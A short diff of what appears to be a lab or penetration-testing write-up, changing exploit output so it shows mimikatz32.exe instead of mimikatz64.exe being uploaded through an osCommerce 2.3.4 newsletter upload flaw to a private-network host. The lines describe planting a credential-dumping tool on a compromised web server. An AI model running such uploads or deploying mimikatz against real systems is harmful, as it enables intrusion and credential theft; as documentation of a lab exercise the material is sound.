@@ -230,9 +230,9 @@ I upload an older 32 bit version of **mimikatz 2.1.1** to the system using the s
 [+] Authentication successful
 [+] Successfully prepared the exploit and created a new newsletter with nID 4
 [+] Successfully locked the newsletter. Now attempting to upload..
-[*] Now trying to verify that the file mimikatz64.exe uploaded..
+[*] Now trying to verify that the file mimikatz32.exe uploaded..
 [+] Got a HTTP 200 Reply for the uploaded file!
-[+] The uploaded file should now be available at http://10.10.50.2:8080/oscommerce-2.3.4/catalog/admin/mimikatz64.exe
+[+] The uploaded file should now be available at http://10.10.50.2:8080/oscommerce-2.3.4/catalog/admin/mimikatz32.exe
 ```
 
 You can find the uploaded file in this directory:
